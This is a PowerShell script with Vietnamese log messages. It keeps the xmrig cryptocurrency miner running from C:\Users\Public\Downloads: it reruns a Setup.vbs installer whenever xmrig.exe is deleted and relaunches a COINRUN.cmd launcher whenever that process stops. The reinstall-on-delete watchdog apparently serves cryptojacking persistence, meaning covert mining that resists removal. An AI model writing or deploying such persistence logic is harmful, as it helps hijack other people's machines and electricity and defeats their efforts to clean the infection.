$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"

function Is-XmrigRunning {
    return (Get-Process | Where-Object { $_.Path -eq $xmrigPath }) -ne $null
}

function Start-CoinRun {
    if (Is-XmrigRunning) {
        Write-Host "xmrig.exe đã chạy. Không khởi chạy lại."
        return
    }

    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
    Write-Host "Đã khởi chạy coinrun.cmd"
}

# Lần đầu khởi chạy
if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe không tồn tại. Đang chạy Setup.vbs..."
    if (Test-Path $setupPath) {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        Write-Host "Đã chạy Setup.vbs"

        while (!(Test-Path $xmrigPath)) {
            Write-Host "Đang chờ xmrig.exe xuất hiện..."
            Start-Sleep -Seconds 3
        }

        Start-CoinRun
    } else {
        Write-Error "Không tìm thấy Setup.vbs"
    }
}

# Vòng lặp giám sát
while ($true) {
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "xmrig.exe bị xóa. Đang chạy lại Setup.vbs..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            Write-Host "Đã chạy lại Setup.vbs"

            while (!(Test-Path $xmrigPath)) {
                Write-Host "Đang chờ xmrig.exe xuất hiện lại..."
                Start-Sleep -Seconds 3
            }

            Start-CoinRun
        } else {
            Write-Error "Không tìm thấy Setup.vbs tại $setupPath"
        }
    }

    # Nếu tiến trình coinrun bị tắt (do lỗi) → khởi động lại nếu chưa có xmrig.exe chạy
    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "coinrun.cmd STOPPED. Checking xmrig status..."
        Start-CoinRun
    } elseif ($global:coinRunProcess) {
        Write-Host "coinrun.cmd vẫn đang chạy..."
    }

    Start-Sleep -Seconds 3
}
